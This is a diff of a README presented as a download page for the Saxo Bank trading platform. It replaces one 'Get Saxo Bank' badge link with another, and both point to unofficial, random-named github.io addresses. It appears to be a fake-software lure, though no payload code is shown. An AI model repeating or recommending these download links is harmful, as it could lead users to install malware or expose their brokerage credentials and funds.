@@ -1,11 +1,7 @@
 # Saxo Bank Download — Advanced Desktop Trading Platform
 
-<a href="https://git-app-desktop.github.io/.github/?offer=SaxoBank" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/Get%20Saxo%20Bank%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
-    width="320" 
-    alt="Get Saxo Bank GitHub">
-</a>
+[![GET Saxo Bank](https://img.shields.io/badge/GET%20%E2%80%94%20Saxo-Bank-0078D6?style=for-the-badge&logoColor=white)](https://victo7rbjgjohan3s5son.github.io/.github//Saxo-Bank)
+
 
 ---
 
